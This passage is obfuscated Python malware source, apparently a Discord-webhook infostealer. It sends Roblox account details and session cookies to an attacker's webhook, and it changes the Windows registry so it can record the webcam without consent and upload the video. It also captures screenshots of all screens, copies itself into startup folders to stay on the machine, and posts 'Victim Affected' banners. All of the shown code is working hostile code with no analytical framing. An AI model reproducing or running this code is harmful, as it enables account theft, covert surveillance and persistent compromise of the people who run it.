                CIFOTAKAVUOJOUDOFXFOTQQPRBFOYHHWEMFDEAWOPBOSKHJINOYSKNHJQKRBWPMUCKHSZWLXXIJZAVLVQDNPRIYKVXFSR.add_field(name=":bust_in_silhouette: DisplayName:", value=f"```{ZCVYHARGCNQRUIALSKEBMGSJSZOWJGXLDFDLZQYVZRIBXMUKKNOXAXH}```", inline=True)
                CIFOTAKAVUOJOUDOFXFOTQQPRBFOYHHWEMFDEAWOPBOSKHJINOYSKNHJQKRBWPMUCKHSZWLXXIJZAVLVQDNPRIYKVXFSR.add_field(name=":robot: Id:", value=f"```{IAAMJLGQFCJUPUXXCIOGIITFWMLKUNWMUQXQKCVRLFOBEMEWEIPETQZBJWADZOQEUHFTSLV}```", inline=True)
                CIFOTAKAVUOJOUDOFXFOTQQPRBFOYHHWEMFDEAWOPBOSKHJINOYSKNHJQKRBWPMUCKHSZWLXXIJZAVLVQDNPRIYKVXFSR.add_field(name=":moneybag: Robux:", value=f"```{YBDNNQXPLJNEEEIPAIUIRCKBIBIVZBAKFPHYGLKICNLXRVDGZKXDSWNQUFBVDXSHEWSUPEMAHVVKAMWLJQCZHG}```", inline=True)
                CIFOTAKAVUOJOUDOFXFOTQQPRBFOYHHWEMFDEAWOPBOSKHJINOYSKNHJQKRBWPMUCKHSZWLXXIJZAVLVQDNPRIYKVXFSR.add_field(name=":tickets: Premium:", value=f"```{JVBZWDBVUBQSOWKAZEHSEDAQXRJKWEETSGYAQIJNWAEUOOTRIRBPIAUCEFBLMJZBJANKAEFJBMXRZIPIGSS}```", inline=True)
                CIFOTAKAVUOJOUDOFXFOTQQPRBFOYHHWEMFDEAWOPBOSKHJINOYSKNHJQKRBWPMUCKHSZWLXXIJZAVLVQDNPRIYKVXFSR.add_field(name=":construction_site: Builders Club:", value=f"```{CGSLSHNDCBEDIGDTTSREYACRMSJHZXBCDUNEUIBTQTHNUAMZRIQQTBFJSLQYVMKHNUMTLAIUJFMUNKTUSTWKWVZSXZCHP}```", inline=True)
                CIFOTAKAVUOJOUDOFXFOTQQPRBFOYHHWEMFDEAWOPBOSKHJINOYSKNHJQKRBWPMUCKHSZWLXXIJZAVLVQDNPRIYKVXFSR.add_field(name=":cookie: Cookie Part 1:", value=f"```{SAHCJGXHQXTBUPPAMEYOWFMZTDLNEAKVXZYJBKCFDIJALUGWQYXTNQQKNIAHQWZNUPSV}```", inline=False)
                CIFOTAKAVUOJOUDOFXFOTQQPRBFOYHHWEMFDEAWOPBOSKHJINOYSKNHJQKRBWPMUCKHSZWLXXIJZAVLVQDNPRIYKVXFSR.add_field(name=":cookie: Cookie Part 2:", value=f"```{ZEKMXEDEVQWQCJOWDXPNHFWYNVVDWJYXJMHYEQCMQOFKALEHNLCWQKFABLLJCITJMH}```", inline=False)

                BPIWZODXWRGUBJBAODLIOORTTSBWADFMOAYUTBXRVSPWHESDLKUKLNJHCXCHBNQXKZQRBPPWFPU.send(embed=CIFOTAKAVUOJOUDOFXFOTQQPRBFOYHHWEMFDEAWOPBOSKHJINOYSKNHJQKRBWPMUCKHSZWLXXIJZAVLVQDNPRIYKVXFSR, username=EDNCJPKOOWRZABGFRDZJSVDIFEHZOTMQTTJTUDYCZNKTMFHAECEAIDSZMWSKZMILUAELZPVEOPCHJHYQPMILGE,
                                avatar_url=KTQVWMSTTEAESDKQKEDKZZJBOBHJLJDUWXDFFPPCMLWKQCZNJLUMM)
                
    if not DSVBPCFRDAXTDIFMOCQKYUBTXKDGQQRVZUGPYCYGCMBTUOQCGQVGHZJL:
        TWYCHAEIQDBWJMQHOYQYFUZCEBUZHCCOIZISGVNCSECAUXVOIXCWCCPZJQYNV(
            AODWOCTILMTMEAAACBOMEZSIVQUBCVJOIZLCZTDJTKHUOTOIVYSKWXFFZWOEMEXWCNMHZRRNGABSVZUFJILASDVKPGOSLAEKP, 
            title=f'Roblox Cookie {MIHDISJMOAEYGDHEJFQCSWBQSUGOOUDJFSEGHCYWGJOUKDYUSWSIKUGBLJDNHWJUUYSCKAQKGVWMXFWVORMZ}:', 
            description=f"No roblox cookie found."
        )

def IVGOWPLGLPNENTXOQHSPEMMDLPPAKHAWUDZKWZXZRYKGKJXYTQOQGVBQWT():
    import os
    import cv2
    from discord import SyncWebhook, Embed, File
    from datetime import datetime
    import winreg
    from datetime import datetime

    try:
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore" + r'\webcam', 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, 'Value', 0, winreg.REG_SZ, 'Allow')
            winreg.CloseKey(key)
        except: pass
        TAEOQRMJQZDEBLXQNFYKXIJSMRLOMHFNYEVMHOUQOZMTFOJTKKB_file_capture = f"CameraCapture_{IWLNAHYAYAPQKEUHGHXOJPPQALRCNKVREJWFOJVXWAVOKWAWZAG}.avi"

        def C4ptur3(FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY_file_capture):
            OJIXDQEWBETCVXVRXHNUBHQVGCJNSKRFGDZUTCIOEUVGWFNJWSLXEXOBGJCNZRMAXVOREWCTUTYANUZCQCHDPWP_capture = 15
            BZXOFTVFEPFABMLVTWXCTYNBYQIYFFMWEUVKUFWIAOJHOHAQVSVEEBSIPZFCLQVWWHMQYLHLGJPCTXKEPBBIFLDTRPRBMCGS = cv2.VideoCapture(0)

            if not BZXOFTVFEPFABMLVTWXCTYNBYQIYFFMWEUVKUFWIAOJHOHAQVSVEEBSIPZFCLQVWWHMQYLHLGJPCTXKEPBBIFLDTRPRBMCGS.isOpened():
                HCMUHEJHYRVLZUNLFEMRDZTGZLTJQAFBMQUUJSTRTPGPWHKAKWEUSZYKFSGIWZTVG()
                TWYCHAEIQDBWJMQHOYQYFUZCEBUZHCCOIZISGVNCSECAUXVOIXCWCCPZJQYNV(
                    AODWOCTILMTMEAAACBOMEZSIVQUBCVJOIZLCZTDJTKHUOTOIVYSKWXFFZWOEMEXWCNMHZRRNGABSVZUFJILASDVKPGOSLAEKP, 
                    title=f'Camera Capture {IWLNAHYAYAPQKEUHGHXOJPPQALRCNKVREJWFOJVXWAVOKWAWZAG} "{GVDBMXTRFQDBEFLPBWQZEYLQMFDGUDIIGREWFPTDGHILXSOMMYFJBRKMGJZASCKVOBQSHV}":', 
                    description=f"No cameras found."
                )
                status = "exit"
                return status
            
            DNBOJJOMBSGFFQKPZEOWFTRJTWYVOCXCNMHRFRGJFBXRCDAHEPTHMQKJVNTHLULAHTA = cv2.VideoWriter_fourcc(*'XVID')
            OAZWCHIRJKMLGFBHEYKLZOBESZTHZGVLKHUVADLXDBCLXBBEQWZOTXBWCQXDPIHOXHNICMFNDSLNPV = cv2.VideoWriter(FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY_file_capture, DNBOJJOMBSGFFQKPZEOWFTRJTWYVOCXCNMHRFRGJFBXRCDAHEPTHMQKJVNTHLULAHTA, 20.0, (640, 480))
            OJIXDQEWBETCVXVRXHNUBHQVGCJNSKRFGDZUTCIOEUVGWFNJWSLXEXOBGJCNZRMAXVOREWCTUTYANUZCQCHDPWP_start = datetime.now()
            while (datetime.now() - OJIXDQEWBETCVXVRXHNUBHQVGCJNSKRFGDZUTCIOEUVGWFNJWSLXEXOBGJCNZRMAXVOREWCTUTYANUZCQCHDPWP_start).seconds < OJIXDQEWBETCVXVRXHNUBHQVGCJNSKRFGDZUTCIOEUVGWFNJWSLXEXOBGJCNZRMAXVOREWCTUTYANUZCQCHDPWP_capture:
                v4r_ret, v4r_frame = BZXOFTVFEPFABMLVTWXCTYNBYQIYFFMWEUVKUFWIAOJHOHAQVSVEEBSIPZFCLQVWWHMQYLHLGJPCTXKEPBBIFLDTRPRBMCGS.read()
                if not v4r_ret:
                    break
                OAZWCHIRJKMLGFBHEYKLZOBESZTHZGVLKHUVADLXDBCLXBBEQWZOTXBWCQXDPIHOXHNICMFNDSLNPV.write(v4r_frame)

            BZXOFTVFEPFABMLVTWXCTYNBYQIYFFMWEUVKUFWIAOJHOHAQVSVEEBSIPZFCLQVWWHMQYLHLGJPCTXKEPBBIFLDTRPRBMCGS.release()
            OAZWCHIRJKMLGFBHEYKLZOBESZTHZGVLKHUVADLXDBCLXBBEQWZOTXBWCQXDPIHOXHNICMFNDSLNPV.release()
            status = None
            
            return status

        try:
            FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY_file_capture = os.path.join(HKVVRUMNSUYQWZNJFEZHTTULOTHRNAZLRYUDKFKCRJAYUKRGSZFIGULNVAVUJCRBPOGWVKVYAEVVWPBR, 'Documents', TAEOQRMJQZDEBLXQNFYKXIJSMRLOMHFNYEVMHOUQOZMTFOJTKKB_file_capture)
            status = C4ptur3(FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY_file_capture)
        except:
            FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY_file_capture = TAEOQRMJQZDEBLXQNFYKXIJSMRLOMHFNYEVMHOUQOZMTFOJTKKB_file_capture
            status = C4ptur3(FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY_file_capture)
        
        if status == "exit":
            return

        CIFOTAKAVUOJOUDOFXFOTQQPRBFOYHHWEMFDEAWOPBOSKHJINOYSKNHJQKRBWPMUCKHSZWLXXIJZAVLVQDNPRIYKVXFSR = Embed(title=f"Camera Capture {MIHDISJMOAEYGDHEJFQCSWBQSUGOOUDJFSEGHCYWGJOUKDYUSWSIKUGBLJDNHWJUUYSCKAQKGVWMXFWVORMZ}:", color=TVDUMGXYYHGQZSGVGEFHOYJVEZIKDFGLIBVTCOBQOFOFKCFKQCYGPZLAMDPIDKOCXKHPOQRIIIFX, description=f"```└── 📷 - {TAEOQRMJQZDEBLXQNFYKXIJSMRLOMHFNYEVMHOUQOZMTFOJTKKB_file_capture}```")
        CIFOTAKAVUOJOUDOFXFOTQQPRBFOYHHWEMFDEAWOPBOSKHJINOYSKNHJQKRBWPMUCKHSZWLXXIJZAVLVQDNPRIYKVXFSR.set_footer(text=WLRZPDJPMGCSTFWQPVTKMZLOAIZWOYMVCHXJMCMGJUBXGPJGBQDNOBKGGERVNINJRAOYLMLHHPXPKGWBOALELV, icon_url=KTQVWMSTTEAESDKQKEDKZZJBOBHJLJDUWXDFFPPCMLWKQCZNJLUMM)

        BPIWZODXWRGUBJBAODLIOORTTSBWADFMOAYUTBXRVSPWHESDLKUKLNJHCXCHBNQXKZQRBPPWFPU = SyncWebhook.from_url(AODWOCTILMTMEAAACBOMEZSIVQUBCVJOIZLCZTDJTKHUOTOIVYSKWXFFZWOEMEXWCNMHZRRNGABSVZUFJILASDVKPGOSLAEKP)
        with open(FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY_file_capture, "rb") as f:
            BPIWZODXWRGUBJBAODLIOORTTSBWADFMOAYUTBXRVSPWHESDLKUKLNJHCXCHBNQXKZQRBPPWFPU.send(
                embed=CIFOTAKAVUOJOUDOFXFOTQQPRBFOYHHWEMFDEAWOPBOSKHJINOYSKNHJQKRBWPMUCKHSZWLXXIJZAVLVQDNPRIYKVXFSR,
                file=File(f, filename=TAEOQRMJQZDEBLXQNFYKXIJSMRLOMHFNYEVMHOUQOZMTFOJTKKB_file_capture),
                username=EDNCJPKOOWRZABGFRDZJSVDIFEHZOTMQTTJTUDYCZNKTMFHAECEAIDSZMWSKZMILUAELZPVEOPCHJHYQPMILGE,
                avatar_url=KTQVWMSTTEAESDKQKEDKZZJBOBHJLJDUWXDFFPPCMLWKQCZNJLUMM
            )
            
        if os.path.exists(FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY_file_capture):
            os.remove(FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY_file_capture)
    except Exception as e:
        TWYCHAEIQDBWJMQHOYQYFUZCEBUZHCCOIZISGVNCSECAUXVOIXCWCCPZJQYNV(
            AODWOCTILMTMEAAACBOMEZSIVQUBCVJOIZLCZTDJTKHUOTOIVYSKWXFFZWOEMEXWCNMHZRRNGABSVZUFJILASDVKPGOSLAEKP, 
            title=f'Camera Capture {MIHDISJMOAEYGDHEJFQCSWBQSUGOOUDJFSEGHCYWGJOUKDYUSWSIKUGBLJDNHWJUUYSCKAQKGVWMXFWVORMZ}:', 
            description=f"""Unable to make a recording:
            ```{e}```"""
        )

def WQTZYAKPXEQVSDIWSBBKNBSCIWNRPLGDTCVWOUTZNLDIFETLHAJXLUBHTD():
    import io
    from PIL import ImageGrab
    from discord import SyncWebhook, Embed, File
    
    try:
        def C4ptur3():
            MWMXULBBCCTGTSBLEVWTZOILDGUFRXKSLAIDYVFRWQABEOHPCIESIQGOVVKUJGBUZLPYLARHCBCBBOWWFUFJWBUXTCRCCKNWNH = ImageGrab.grab(
                bbox=None,
                include_layered_windows=False,
                all_screens=True,
                xdisplay=None
            )
            MWMXULBBCCTGTSBLEVWTZOILDGUFRXKSLAIDYVFRWQABEOHPCIESIQGOVVKUJGBUZLPYLARHCBCBBOWWFUFJWBUXTCRCCKNWNH_bytes = io.BytesIO()
            MWMXULBBCCTGTSBLEVWTZOILDGUFRXKSLAIDYVFRWQABEOHPCIESIQGOVVKUJGBUZLPYLARHCBCBBOWWFUFJWBUXTCRCCKNWNH.save(MWMXULBBCCTGTSBLEVWTZOILDGUFRXKSLAIDYVFRWQABEOHPCIESIQGOVVKUJGBUZLPYLARHCBCBBOWWFUFJWBUXTCRCCKNWNH_bytes, format='PNG')
            MWMXULBBCCTGTSBLEVWTZOILDGUFRXKSLAIDYVFRWQABEOHPCIESIQGOVVKUJGBUZLPYLARHCBCBBOWWFUFJWBUXTCRCCKNWNH_bytes.seek(0)
            return MWMXULBBCCTGTSBLEVWTZOILDGUFRXKSLAIDYVFRWQABEOHPCIESIQGOVVKUJGBUZLPYLARHCBCBBOWWFUFJWBUXTCRCCKNWNH_bytes
        
        MWMXULBBCCTGTSBLEVWTZOILDGUFRXKSLAIDYVFRWQABEOHPCIESIQGOVVKUJGBUZLPYLARHCBCBBOWWFUFJWBUXTCRCCKNWNH_bytes = C4ptur3()

        CIFOTAKAVUOJOUDOFXFOTQQPRBFOYHHWEMFDEAWOPBOSKHJINOYSKNHJQKRBWPMUCKHSZWLXXIJZAVLVQDNPRIYKVXFSR = Embed(title=f"Screenshot {MIHDISJMOAEYGDHEJFQCSWBQSUGOOUDJFSEGHCYWGJOUKDYUSWSIKUGBLJDNHWJUUYSCKAQKGVWMXFWVORMZ}:", color=TVDUMGXYYHGQZSGVGEFHOYJVEZIKDFGLIBVTCOBQOFOFKCFKQCYGPZLAMDPIDKOCXKHPOQRIIIFX)
        CIFOTAKAVUOJOUDOFXFOTQQPRBFOYHHWEMFDEAWOPBOSKHJINOYSKNHJQKRBWPMUCKHSZWLXXIJZAVLVQDNPRIYKVXFSR.set_image(url="attachment://screenshot.png")
        CIFOTAKAVUOJOUDOFXFOTQQPRBFOYHHWEMFDEAWOPBOSKHJINOYSKNHJQKRBWPMUCKHSZWLXXIJZAVLVQDNPRIYKVXFSR.set_footer(text=WLRZPDJPMGCSTFWQPVTKMZLOAIZWOYMVCHXJMCMGJUBXGPJGBQDNOBKGGERVNINJRAOYLMLHHPXPKGWBOALELV, icon_url=KTQVWMSTTEAESDKQKEDKZZJBOBHJLJDUWXDFFPPCMLWKQCZNJLUMM)
        BPIWZODXWRGUBJBAODLIOORTTSBWADFMOAYUTBXRVSPWHESDLKUKLNJHCXCHBNQXKZQRBPPWFPU = SyncWebhook.from_url(AODWOCTILMTMEAAACBOMEZSIVQUBCVJOIZLCZTDJTKHUOTOIVYSKWXFFZWOEMEXWCNMHZRRNGABSVZUFJILASDVKPGOSLAEKP)
        BPIWZODXWRGUBJBAODLIOORTTSBWADFMOAYUTBXRVSPWHESDLKUKLNJHCXCHBNQXKZQRBPPWFPU.send(
            embed=CIFOTAKAVUOJOUDOFXFOTQQPRBFOYHHWEMFDEAWOPBOSKHJINOYSKNHJQKRBWPMUCKHSZWLXXIJZAVLVQDNPRIYKVXFSR,
            file=File(MWMXULBBCCTGTSBLEVWTZOILDGUFRXKSLAIDYVFRWQABEOHPCIESIQGOVVKUJGBUZLPYLARHCBCBBOWWFUFJWBUXTCRCCKNWNH_bytes, filename="screenshot.png"),
            username=EDNCJPKOOWRZABGFRDZJSVDIFEHZOTMQTTJTUDYCZNKTMFHAECEAIDSZMWSKZMILUAELZPVEOPCHJHYQPMILGE,
            avatar_url=KTQVWMSTTEAESDKQKEDKZZJBOBHJLJDUWXDFFPPCMLWKQCZNJLUMM
        )
    except Exception as e:
        TWYCHAEIQDBWJMQHOYQYFUZCEBUZHCCOIZISGVNCSECAUXVOIXCWCCPZJQYNV(
            AODWOCTILMTMEAAACBOMEZSIVQUBCVJOIZLCZTDJTKHUOTOIVYSKWXFFZWOEMEXWCNMHZRRNGABSVZUFJILASDVKPGOSLAEKP, 
            title=f'Screenshot {MIHDISJMOAEYGDHEJFQCSWBQSUGOOUDJFSEGHCYWGJOUKDYUSWSIKUGBLJDNHWJUUYSCKAQKGVWMXFWVORMZ}:', 
            description=f"""**Unable to take a screenshot:**
            ```{e}```"""
        )

def St4rtup():
    import os
    import sys
    import shutil

    try:
        PIIKQARMVIEPBXUFYGDKYWCIEDRGXHEKIWYGOFEKMKWXQBFSNIQYKTALHGYSPFOKFSFORTZFIRJLBPQ = os.path.abspath(sys.argv[0])

        if PIIKQARMVIEPBXUFYGDKYWCIEDRGXHEKIWYGOFEKMKWXQBFSNIQYKTALHGYSPFOKFSFORTZFIRJLBPQ.endswith(".exe"):
            CCKOGDZDFCXBDJEVZAKMHKODRIIVHEUPKDFWROGMWVCHAQHZQZLFKYKWZC = "exe"
        elif PIIKQARMVIEPBXUFYGDKYWCIEDRGXHEKIWYGOFEKMKWXQBFSNIQYKTALHGYSPFOKFSFORTZFIRJLBPQ.endswith(".py"):
            CCKOGDZDFCXBDJEVZAKMHKODRIIVHEUPKDFWROGMWVCHAQHZQZLFKYKWZC = "py"

        KZRGOYWLMMTAXKUDQEBLMZPPLCMCJNPRDWIRKHSNFIIXJIZYQUBPSOEBJDPWOIRIARPGHJXBL = f"ㅤ.{CCKOGDZDFCXBDJEVZAKMHKODRIIVHEUPKDFWROGMWVCHAQHZQZLFKYKWZC}"

        if sys.platform.startswith('win'):  
            TZMBKASCUZTNAVRUBRYNKQBTDOKEVXPYKMHHXIMAEODSLVCZESI = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        elif sys.platform.startswith('darwin'): 
            TZMBKASCUZTNAVRUBRYNKQBTDOKEVXPYKMHHXIMAEODSLVCZESI = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
        elif sys.platform.startswith('linux'):
            TZMBKASCUZTNAVRUBRYNKQBTDOKEVXPYKMHHXIMAEODSLVCZESI = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
        FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY_new_file = os.path.join(TZMBKASCUZTNAVRUBRYNKQBTDOKEVXPYKMHHXIMAEODSLVCZESI, KZRGOYWLMMTAXKUDQEBLMZPPLCMCJNPRDWIRKHSNFIIXJIZYQUBPSOEBJDPWOIRIARPGHJXBL)

        shutil.copy(PIIKQARMVIEPBXUFYGDKYWCIEDRGXHEKIWYGOFEKMKWXQBFSNIQYKTALHGYSPFOKFSFORTZFIRJLBPQ, FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY_new_file)
        os.chmod(FJRBPEMJETGULSWKFLATBIVSCWJKEZTARXQHBZUGQULYNZJBBQFTCGQRGZY_new_file, 0o777) 
    except:
        pass

try: requests.post(AODWOCTILMTMEAAACBOMEZSIVQUBCVJOIZLCZTDJTKHUOTOIVYSKWXFFZWOEMEXWCNMHZRRNGABSVZUFJILASDVKPGOSLAEKP, json={'content': f'****╔═════════════════Victim Affected═════════════════╗****', 'username': EDNCJPKOOWRZABGFRDZJSVDIFEHZOTMQTTJTUDYCZNKTMFHAECEAIDSZMWSKZMILUAELZPVEOPCHJHYQPMILGE, 'avatar_url': KTQVWMSTTEAESDKQKEDKZZJBOBHJLJDUWXDFFPPCMLWKQCZNJLUMM,})
except: pass
try: threading.Thread(target=FRTATIIDFYSEYWHWKXRTFGEULCEXOVTXRFXEURELJCHJZQRETIJXK).start()
except: pass
try: threading.Thread(target=WUIOYQCHSGHCEPRGUSPPRQXOGGMVVOORIPXCTTYKESJJBFMTKTTAJQTTIUOXCYTEQCCHNRKVWZAE).start()
except: pass
try: threading.Thread(target=ZKFNULLIKNQVTLQDEMVTESCHRABLPXOQKDIEPUBVVFNNCRANCXXFNNOJHWNZNKKMRGRHTNCTFFIHXFMOHL).start()
except: pass
try: threading.Thread(target=ZWSWIBDPUFNWAVGGBECMHZEUQPFJSADWUTHUVEWGFJAKSFJKMOHULCTAKKMFCEFEEMQTGNHXLBIOZCRJJUYYTUHFYM).start()
except: pass
try: LNVSPYOHXYUZTIPFNZCBHXGAJMOEIXMNCCSHJNDCCWCQBUADHNBLLJRKWVMVOMIODUUKIAGKIHMRYHCYVYBYGOYXCD()
except: pass
try: CIEMICBUWUBSRYWSIZAFLYMVRGNMIRISBUWZPATWDPXIQBMYWTIJRXRMBWAKSQUFGH()
except: pass
try: EZJDZRCIPICDZNLWPHBZZGFPTWITXZGQSTIJWFHGWCEFFDVTSNEZHQBAYBLXPYTCRNQAPDEJVPXOEY()
except: pass
try: AUNKPANUTRTFVNNKHHGNLGCSCREXUGJKWUFROHVLXENTICPFKTXFKZCYAWOGURCFJUTMFLKWVVIXZUWCOFFJXWKDLHIYJWLT()
except: pass
try: YHBAYPPFTTEIPHOYLNYRRXYEZDLQUPZZOPJLLFWBXXFMPGYUCQPAGWNZDKQUDGVLJYVLYGWEEASMBGTQOQPBSWNRHLBIWG()
except: pass
try: IVGOWPLGLPNENTXOQHSPEMMDLPPAKHAWUDZKWZXZRYKGKJXYTQOQGVBQWT()
except: pass
try: ILBDLGSBRYJJLWQCUSSYMAQPOTSQZCJVZXTMFISUBALLBUIIOPBGRULXRFBZHLKHLEUJTAZBUFIHXZGFYSNY()
except: pass
try: WQTZYAKPXEQVSDIWSBBKNBSCIWNRPLGDTCVWOUTZNLDIFETLHAJXLUBHTD()
except: pass
try: requests.post(AODWOCTILMTMEAAACBOMEZSIVQUBCVJOIZLCZTDJTKHUOTOIVYSKWXFFZWOEMEXWCNMHZRRNGABSVZUFJILASDVKPGOSLAEKP, json={'content': f'****╚══════════════════{GVDBMXTRFQDBEFLPBWQZEYLQMFDGUDIIGREWFPTDGHILXSOMMYFJBRKMGJZASCKVOBQSHV}══════════════════╝****', 'username': EDNCJPKOOWRZABGFRDZJSVDIFEHZOTMQTTJTUDYCZNKTMFHAECEAIDSZMWSKZMILUAELZPVEOPCHJHYQPMILGE, 'avatar_url': KTQVWMSTTEAESDKQKEDKZZJBOBHJLJDUWXDFFPPCMLWKQCZNJLUMM})
except: pass
try: threading.Thread(target=WKRKAAHFJWKWDBNYYJGMYRNNPNUVGWHPBPPGXWOREJMIUUBXGFNOLRCLFS).start()
except: pass
try: threading.Thread(target=GUHXBYQUTEWNHCVIVNFLYBHCHWWXDOQGCIXFXABRRVONJDMKEUT).start()
except: pass
try: threading.Thread(target=BJIWXSWIZPSRVPHXSDWSJTFUKUDXVJNXZTSNNYVTIFYDVIQXHSEWCNKOEHVDHCVONNZTMRMSOOX).start()
except: pass
try: threading.Thread(target=TSKPSHVHPGUMIUJWVPUTZEVWLGPJEBOQTPGKJAXWGFDYBPBWDNJOXWGAQHFXXEUMHBBAYPEKEXLENBMWF).start()
except: pass
